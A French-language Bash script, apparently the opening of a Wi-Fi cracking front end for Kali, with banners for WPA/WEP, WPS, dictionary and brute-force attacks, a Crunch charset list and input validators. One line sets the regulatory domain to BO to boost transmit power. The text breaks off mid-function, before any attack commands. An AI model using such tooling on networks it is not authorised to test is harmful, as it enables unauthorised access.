#!/bin/bash

clear

###################################################### A propos #######################################################################################

#Title........: GUI-Crackinall.sh
#Description..: This is a multi-use bash script for Linux systems to audit your wireless networks.
#Date.........: 08/07/2018
#Version......: 2.0
#Usage........: bash GUI-Crackinall.sh
#Bash version : 4.4.23(1)
#Kali version : 4.17.0-kali3-amd64
#Nvidia drivers version : 390.77-1
#Nvidia cuda toolkit version : 8.0.44-4
#GPU : GeForce GTX 460M

###################################################### Fonctions utiles ###############################################################################

###################################################### Disclaimer #####################################################################################

#Disclaimer : 

#GUI_Crackinall is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own
#or have permission to test. 

#Any other use is not the responsibility of the developer(s). Be sure that you understand and are complying with laws in your area. In other words, don't be stupid, don't be an asshole, and use this tool responsibly and legally."

###################################################### Disclaimer #####################################################################################


intro4="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    # 
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :            					            :  #
				#  :	    \033[1mAttaque WPA / WEP  \033[32m\033[1mON\033[0m                                   :  #
				#  :		   \033[1mRécupération du handshake : \033[32m\033[1mON\033[0m  		:      #
				#  :                       \033[1mAttaque par dictionnaire : \033[32m\033[1mON\033[0m 	    :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"



intro5="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPA / WEP  \033[32m\033[1mON\033[0m                           :  #
				#  :		    \033[1mRécupération du handshake : \033[32m\033[1mON\033[0m 	               #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"


intro6="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :            					            :  #
				#  :	    \033[1mAttaque WPA / WEP  \033[32m\033[1mON\033[0m                                   :  #
				#  :		   \033[1mRécupération du handshake : \033[32m\033[1mON\033[0m  		    :  #
				#  :                       \033[1mAttaque bruteforce Crunch : \033[32m\033[1mON\033[0m 	    :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"


intro10="


				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :      							    :  #
				#  :		\033[34m\033[1m#Bash version : 4.4.23(1)\033[0m                           :  #
				#  :		\033[34m\033[1m#Kali version : 4.17.0-kali3-amd64\033[0m  		    :  #
				#  :		\033[34m\033[1m#Nvidia drivers version : 390.77-1\033[0m 		    :  #
				#  :		\033[34m\033[1m#Nvidia cuda toolkit version : 8.0.44-4\033[0m 	    :  #
				#  :		\033[34m\033[1m#GPU : GeForce GTX 460M\033[0m   			    :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"



intro_menu=" 				Nouvelles écoutes parallèles - Paramètres différents ? 
                                                          
				# 1) Nouvelle écoute avec autre interface WIFI      #
				# 2) Nouvelle écoute avec autre protocole d'écoute  #
				# 3) Nouvelle écoute avec autre canal d'écoute      #
				# 4) Continuer sans modification...  	            # 

"
intro_menu10="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPS (Reaver, bully) :\033[31m\033[1mOFF\033[0m                :  #
				#  :		    \033[1mAttaque WPA / WEP : \033[32m\033[1mON\033[0m 	                       #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################

------------------------------------------------------------------------------------------------------------------------------------------------------"

intro_menu11="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPS (Reaver, bully) :\033[32m\033[1mON\033[0m                 :  #
				#  :		    \033[1mAttaque WPA / WEP : \033[31m\033[1mOFF\033[0m 	                       #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################

------------------------------------------------------------------------------------------------------------------------------------------------------"
                                                         
intro_menu12="			

------------------------------------------------------------------------------------------------------------------------------------------------------
				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPS (Reaver, bully) [Y/n] ?\033[0m             :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m       		       #
				\`#######################################################################"	

intro98="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPA - Dictionnaire  \033[32m\033[1mON\033[0m                  :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro97="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WPA - Bruteforce  \033[32m\033[1mON\033[0m                    :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro96="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WEP - ARP  \033[32m\033[1mON\033[0m                           :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro95="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mAttaque WEP - Chopchop \033[32m\033[1mON\033[0m                       :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro94="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh   \033[0m        #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                           \033[1mHandshake \033[32m\033[1mON\033[0m                         :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro93="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mPyrit - Dico / Attack_Passthrough  \033[32m\033[1mON\033[0m           :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro92="				
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mPyrit - Dico / Préparation Attack_db  \033[32m\033[1mON\033[0m        :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro91="			
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1mPyrit - Dico / Attack_db  \033[32m\033[1mON\033[0m                    :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"
intro90="			
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1m   Pyrit + Cowpatty \033[32m\033[1mON\033[0m                          :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro100="

\033[32m\033[1m  Disclaimer : 

  GUI_Crackinall is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own
  or have permission to test. 

  Any other use is not the responsibility of the developer(s). Be sure that you understand and are complying with the GUI-Crackinall licenses
  and laws in your area. In other words, don't be stupid, don't be an asshole, and use this tool responsibly and legally.\033[0m"


intro101="			
				########################################################################
				#               \033[34m\033[1m  Meckwells # 08/07/2018 # GUI-Crackinall.sh       \033[0m    #
				#  .................:            v2.x              :.................  #
				#  :                :..............................:                :  #
				#  :                                                                :  #
				#  :                \033[1m   Autoshake \033[32m\033[1mON\033[0m                                 :  #
				#  :                                                                :  #
				#  :                                               .................:  #
				#  :                                               : \033[34m\033[1mMeckwells@2018\033[0m :  #
				#  :...............................................:................:  #
				#                     \033[34m\033[1mbash GUI-crackinall.sh\033[0m		               #
				\`#######################################################################"

intro102="

\033[32m\033[1m  IMPORTANT : 

  Autoshake permet d'activer / désactiver une écoute généralisée automatique au démarrage de Kali Linux en tâche de fond. 
  Cette écoute généralisée peut nécessiter de grandes capacités mémoire sur le disque dur.
  Il est donc nécessaire de monitorer en temps réel la mémoire disponible sur votre HD et plus généralement de savoir
  ce que vous faites avant d'utiliser cet outil.   

"

		#### Charset.lst

charset="hex-lower                     = [0123456789abcdef]
hex-upper                     = [0123456789ABCDEF]

numeric                       = [0123456789]
numeric-space                 = [0123456789 ]

symbols14                     = [!@#$%^&*()-_+=]
symbols14-space               = [!@#$%^&*()-_+= ]

symbols-all                   = [!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
symbols-all-space             = [!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

ualpha                        = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]
ualpha-space                  = [ABCDEFGHIJKLMNOPQRSTUVWXYZ ]
ualpha-numeric                = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
ualpha-numeric-space          = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
ualpha-numeric-symbol14       = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
ualpha-numeric-symbol14-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
ualpha-numeric-all            = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
ualpha-numeric-all-space      = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

lalpha                        = [abcdefghijklmnopqrstuvwxyz]
lalpha-space                  = [abcdefghijklmnopqrstuvwxyz ]
lalpha-numeric                = [abcdefghijklmnopqrstuvwxyz0123456789]
lalpha-numeric-space          = [abcdefghijklmnopqrstuvwxyz0123456789 ]
lalpha-numeric-symbol14       = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=]
lalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+= ]
lalpha-numeric-all 	      = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
lalpha-numeric-all-space      = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

mixalpha                   = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]
mixalpha-space             = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ]
mixalpha-numeric           = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
mixalpha-numeric-space     = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
mixalpha-numeric-symbol14  = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
mixalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
mixalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

#########################################################################################
#                 SWEDISH CHAR-SUPPORT                                                  # #########################################################################################

#########################
# Uppercase             #
#########################
ualpha-sv                        = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
ualpha-space-sv                  = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
ualpha-numeric-sv                = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
ualpha-numeric-space-sv          = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
ualpha-numeric-symbol14-sv       = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
ualpha-numeric-symbol14-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
ualpha-numeric-all-sv            = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
ualpha-numeric-all-space-sv      = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

#########################
# Lowercase             #
#########################
lalpha-sv                        = [abcdefghijklmnopqrstuvwxyzåäö]
lalpha-space-sv                  = [abcdefghijklmnopqrstuvwxyzåäö ]
lalpha-numeric-sv                = [abcdefghijklmnopqrstuvwxyzåäö0123456789]
lalpha-numeric-space-sv          = [abcdefghijklmnopqrstuvwxyzåäö0123456789 ]
lalpha-numeric-symbol14-sv       = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=]
lalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+= ]
lalpha-numeric-all-sv            = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
lalpha-numeric-all-space-sv      = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]

#########################
# Mixcase               #
#########################
mixalpha-sv                   = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
mixalpha-space-sv             = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
mixalpha-numeric-sv           = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
mixalpha-numeric-space-sv     = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
mixalpha-numeric-symbol14-sv  = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
mixalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
mixalpha-numeric-all-sv       = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/]
mixalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~``[]{}|\:;""''<>,.?/ ]"

		#### Charset.lst

		#### Maîtrise des signaux de sortie

function trapCtrlC() {

	echo -e '\033[1m\n\E[2KCtrl+C pressed... Stopping Crackinall... Restoring interface initial mode !\033[0m'
	echo
	echo -e " \033[31m\033[1m--------------------------------------------------- 		Arrêt du script        ---------------------------------------------------------------\033[0m"
	echo
  	echo -e "  => \033[1mRedémarrage de NetworkManager : \033[0m"
	echo
	NetworkManager Restart
	echo
	echo -e " 	=> \033[1mNetworkManager \033[32m\033[1mOK\033[0m "
	echo
	echo -e "  => \033[1mPassages des interfaces en mode managed : \033[0m"
	echo
		ifconfig wlan0 down
		iwconfig wlan0 mode managed
		ifconfig wlan0 up
		ifconfig wlan1 down
		iwconfig wlan1 mode managed
		ifconfig wlan1 up

	echo
	echo -e "	=> \033[1mAll Interfaces Mode Managed \033[32m\033[1mOK\033[0m" 
	echo
	echo -e " \033[31m\033[1m---------------------------------------------------- 		Arrêt du script        ---------------------------------------------------------------\033[0m"
	echo
	sleep 2
	exit
 	trap trapCtrlC 2
}
trap trapCtrlC 2

function trapCtrlZ() {

	echo -e '\033[1m\n\E[2KCtrl+Z pressed... Rebooting Crackinall... Restoring interface initial mode !\033[0m'
	echo
	echo -e " \033[31m\033[1m--------------------------------------------------- 		Redémarrage du script        ---------------------------------------------------------------\033[0m"
	echo
  	echo -e "  => \033[1mRedémarrage de NetworkManager : \033[0m"
	NetworkManager Restart
	echo
	echo -e " 	=> \033[1mNetworkManager \033[32m\033[1mOK\033[0m "
	echo
	echo -e "  => \033[1mPassages des interfaces en mode managed : \033[0m"

		ifconfig wlan0 down
		iwconfig wlan0 mode managed
		ifconfig wlan0 up
		ifconfig wlan1 down
		iwconfig wlan1 mode managed
		ifconfig wlan1 up

	echo
	echo -e "	=> \033[1mAll Interfaces Mode Managed \033[32m\033[1mOK\033[0m" 
	echo
	echo -e " \033[31m\033[1m---------------------------------------------------- 		Redémarrage du script        ---------------------------------------------------------------\033[0m"
	echo
	sleep 2
	$0
 	trap trapCtrlZ 20
}
trap trapCtrlZ 20

	#### Maîtrise des signaux de sortie

	#### Activation de l'historique

#HISTFILE=~/.bash_history
#HISTTIMEFORMAT='%F %T '
#set -o history

#file="/root/history.txt"
#history >> $file

	#### Activation de l'historique

	#### Fonctions de limitation des choix utilisateurs tout au long du script

		#### Limitation choix interface

function lim_interfaces {

while read var_interface 
do
	iwconfig $var_interface mode monitor	
	ifconfig $var_interface up
	var_code=$?

	if ! [[ $var_code == 0 ]] ; then 

			echo
			echo -e " \033[36m\033[1mPassage en mode moniteur \033[31mNOK\033[0m "
			echo
			echo -e " \033[36m\033[1mVeuillez sélectionner une autre interface...\033[0m "
			echo
	else
			break
	fi 
done

}

function lim_interfaces2 {

while read var_interface2 
do
	iwconfig $var_interface2 mode monitor	
	ifconfig $var_interface2 up
	var_code=$?

	if ! [[ $var_code == 0 ]] ; then 

			echo
			echo -e " \033[36m\033[1mPassage en mode moniteur \033[31mNOK\033[0m "
			echo
			echo -e " \033[36m\033[1mVeuillez sélectionner une autre interface...\033[0m "
			echo
	else
			break
	fi 
done

}

		#### Limitation choix interface

		#### Limitation choix tx power2

function lim_txpower2 {

while [[ -z "$tx_power" ]]
do 
	echo
	echo -e " \033[36m\033[1mChoix impossible, veuillez réessayer... :\033[0m "
	echo
	read tx_power
done

}
#### Limitation choix tx power2


#### Limitation choix tx power
function lim_txpower {

while read tx_power 
do
	echo
	############## Limitation des réponses utilisateurs var_encrypt 
	lim_txpower2
	############## Limitation des réponses utilisateurs var_encrypt 

	if [[ $tx_power == "n" ]] ; then
			echo
			echo -e " \033[36m\033[1m=> Augmentation puissance de réception $var_interface (choix utilisateur) \033[31mNOK\033[0m "
			echo
			echo -e " \033[32m\033[1m=> Le script continue avec txpower $var_interface par défaut...\033[0m "
			echo
			break
	fi

		ifconfig $var_interface down
		iw reg set BO
		ifconfig $var_interface up
		iwconfig $var_interface txpower $tx_power
		var_code2=$?
	
	if [[ ! $var_code2 == 0 ]] ; then 

			echo
			echo -e " \033[36m\033[1m=> Augmentation puissance de réception $var_interface \033[31mNOK\033[0m "
			echo
			echo -e " \033[36m\033[1m=> Veuillez sélectionner une autre interface ou une autre puissance...\033[0m "
			echo
	else
			echo
			echo -e "\033[32m\033[1m=> Augmentation puissance de réception $var_interface OK\033[0m  "
			break
	fi
done

}
#### Limitation choix tx power


#### Limitation choix freq2
function lim_freq2 {

while [[ -z "$var_freq" ]]
do 
	echo
	echo -e " \033[36m\033[1mChoix impossible, veuillez réessayer... :\033[0m "
	echo
	read var_freq
done

while ! [[ "$var_freq" == ?.??G ]] && [[ ! "$var_freq" == ?.?G ]] && [[ ! "$var_freq" == ?.???G ]] && [[ ! "$var_freq" == "n" ]]
do
	echo
	echo -e " \033[36m\033[1mMauvais choix de fréquence, veuillez recommencer... Format accepté : X.XG ou X.XXG ou X.XXXG - n pour quitter] :\033[0m"
	echo
    	read var_freq
done

}
#### Limitation choix freq2


#### Limitation choix freq
function lim_freq {

while read var_freq 
do
	echo
	############## Limitation des réponses utilisateurs var_encrypt 
	lim_freq2
	############## Limitation des réponses utilisateurs var_encrypt 

	if [[ $var_freq == "n" ]] ; then
			echo
			echo -e " \033[36m\033[1m=> Changement fréquence d'écoute $var_interface (choix utilisateur) \033[31mNOK\033[0m "
			echo
			echo -e " \033[32m\033[1m=> Le script continue avec fréquence d'écoute $var_interface par défaut...\033[0m "
			echo
			break
	fi

		ifconfig $var_interface down
		ifconfig $var_interface up
		iwconfig $var_interface freq $var_freq
		var_code2=$?
	
	if ! [[ $var_code2 == 0 ]] ; then 

			echo
			echo -e " \033[36m\033[1m=> Changement fréquence d'écoute $var_interface \033[31mNOK\033[0m "
			echo
			echo -e " \033[36m\033[1m=> Veuillez sélectionner une autre interface ou une autre fréquence...\033[0m "
			echo
	else
			break
	fi
done

}
#### Limitation choix freq

		
#### Limitation choix canaux
function lim_varcanal {

while [ -z $var_canal ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de canal, veuillez réessayer... :\033[0m "
	echo
	read var_canal
done

while ! [[ $var_canal =~ ^[0-9]{1,3}$ ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de canal, veuillez réessayer... :\033[0m  "
	echo
	read var_canal
done

while [ $var_canal != "1" ] && [ $var_canal != "6" ] && [ $var_canal != "11" ]
do 
	echo
	echo -e " \033[36m\033[1m=> Canal choisi hors 1/6/11, continuer ? [Y/n] :\033[0m  " 
	echo
	read var_verifcanal

if [ $var_verifcanal = "Y" ] ;

	then
	break

elif [ $var_verifcanal = "n" ] ;
	
	then
	echo
	echo -e " \033[36m\033[1mVeuillez ressaisir votre choix... :\033[0m  " 
	echo
	read var_canal

fi
done
}
#### Limitation choix canaux

#### Limitation choix runlevel

function lim_runlevel {

while [ -z $runlevel ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de runlevel, veuillez réessayer... :\033[0m "
	echo
	read runlevel
done

while ! [[ $runlevel =~ ^[0-6]{1,1}$ ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de runlevel, veuillez réessayer... :\033[0m  "
	echo
	read runlevel
done

}

#### Limitation choix runlevel

#### Limitation choix protocole d'écoute
function lim_varencrypt {

while   [[ -z "$var_encrypt" ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de protocole, veuillez réessayer... :\033[0m "
	echo
	read var_encrypt
done

while   [[ ! "$var_encrypt" == "wpa" ]] && [[ ! "$var_encrypt" == "wep" ]] && [[ ! "$var_encrypt" == "stop" ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de protocole, veuillez réessayer... :\033[0m "
	echo
	read var_encrypt
done

while   [[ "$var_encrypt" =~ ^([[:digit:]])$ ]]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de protocole, veuillez réessayer... :\033[0m "
	echo
	read var_encrypt
done

}
#### Limitation choix protocole d'écoute


#### Limitation var_change
function var_change {

while [ -z $var_change ] && [ $var_change != "n" ] && [ $var_change != "Y" ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix, veuillez réessayer... :\033[0m"
	echo
	read var_change
done

}
#### Limitation var_change

		
#### Limitation station
function lim_station { 

while [ -z $station ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise station, veuillez recommencer... [Format accepté : XX:XX:XX:XX:XX:XX] : \033[0m"
	echo
	read var_station
done

while ! [[ $station =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]
do
	echo
	echo -e " \033[36m\033[1mMauvais syntaxe station, veuillez recommencer... [Format accepté : XX:XX:XX:XX:XX:XX] : \033[0m"
	echo 
    	read station
done

}
#### Limitation station


#### Limitation bssid
function lim_bssid {

while [ -z $bssid ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais BSSID, veuillez recommencer... Format accepté : XX:XX:XX:XX:XX:XX :\033[0m"
	echo
	read bssid
done

while ! [[ $bssid =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]
do
	echo
	echo -e " \033[36m\033[1mMauvais BSSID, veuillez recommencer... Format accepté : XX:XX:XX:XX:XX:XX :\033[0m"
	echo
    	read bssid 
done

}
#### Limitation bssid


#### Limitation fichiercap
function lim_cap1 {

while [ -z $fichier_cap ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de fichier, veuillez recommencer... [Format accepté : XXXXX.cap] :\033[0m"
	echo
	read fichier_cap
done

while ! [[ $fichier_cap == ????? ]]
do
	echo
	echo -e " \033[36m\033[1mMauvais choix de fichier, veuillez recommencer... Format accepté : XXXXX.cap] :\033[0m"
	echo
    	read fichier_cap
done

}
#### Limitation fichiercap


#### Limitation fichiercap 2 
function lim_cap2 {

while [ -z $fichier_cap ]
do 
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe de fichier, veuillez recommencer... [Format accepté : XXXXX-0x.cap] :\033[0m"
	echo
	read fichier_cap
done

while ! [[ $fichier_cap == ?????-??.cap ]]
do
	echo
	echo -e " \033[36m\033[1mMauvaise syntaxe de fichier, veuillez recommencer... [Format accepté : XXXXX-0x.cap] :\033[0m"
	echo
    	read fichier_cap
done

}
#### Limitation fichiercap 2 

function lim_cow {

while [ -z $fichier_cow ]
do 
	echo
	echo -e " \033[36m\033[1mMauvais choix de fichier, veuillez recommencer... [Format accepté : XXXXX.out] :\033[0m"
	echo
	read fichier_cow
done

while ! [[ $fichier_cow == ????.out ]]
do
	echo
	echo -e " \033[36m\033[1mMauvais choix de fichier, veuillez recommencer... Format accepté : XXXXX.out] :\033[0m"
	echo
    	read fichier_cow
done

}

#### Limitation varwep 
function lim_varwep {

while [ -z $var_attack ]
do 
	echo
